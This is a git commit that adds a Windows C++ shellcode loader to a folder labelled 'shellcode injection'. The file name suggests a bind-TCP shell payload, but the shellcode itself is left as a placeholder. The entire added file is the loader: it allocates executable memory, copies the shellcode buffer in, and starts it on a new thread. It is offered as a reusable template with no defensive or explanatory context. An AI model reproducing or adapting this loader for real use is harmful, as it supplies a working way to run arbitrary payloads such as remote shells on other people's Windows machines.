dcb38f028e256c6f33d4fad82a6f9e6dada86442
David <156260369+korrectional@users.noreply.github.com>
2024-05-10 08:10:23 -0400

    Update bindTCP.cpp

--- shellcode injection - 0xpat/bindTCP.cpp
+++ shellcode injection - 0xpat/bindTCP.cpp
@@ -1,1 +1,12 @@
 
+#include <Windows.h>
+
+void main()
+{
+	const char shellcode[] = "(yer shellcode here)";
+	PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
+	DWORD threadID;
+	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
+	WaitForSingleObject(hThread, INFINITE);
+}
